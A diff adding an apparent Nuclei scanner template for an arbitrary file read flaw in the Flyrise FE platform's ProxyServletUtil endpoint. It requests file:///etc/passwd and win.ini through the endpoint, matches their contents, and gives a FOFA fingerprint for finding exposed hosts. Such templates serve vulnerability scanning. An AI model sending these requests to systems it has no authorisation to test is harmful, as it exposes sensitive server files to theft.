@@ -1,0 +1,31 @@
+id: flyrise-fe-proxyservletutil-fileread
+
+info:
+  name: 飞企互联 FE业务协作平台 ProxyServletUtil 任意文件读取漏洞
+  author: peiqi
+  severity: high
+  description: |
+    飞企互联 FE业务协作平台 ProxyServletUtil 接口存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中敏感文件
+    FOFA: "flyrise.stopBackspace.js"
+  tags: 飞企互联-FE业务协作平台
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ProxyServletUtil?url=file:///c:/Windows/win.ini"
+      - "{{BaseURL}}/ProxyServletUtil?url=file:///etc/passwd"
+    
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "bit app support"
+          - "fonts"
+          - "extensions"
+        condition: and
+
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
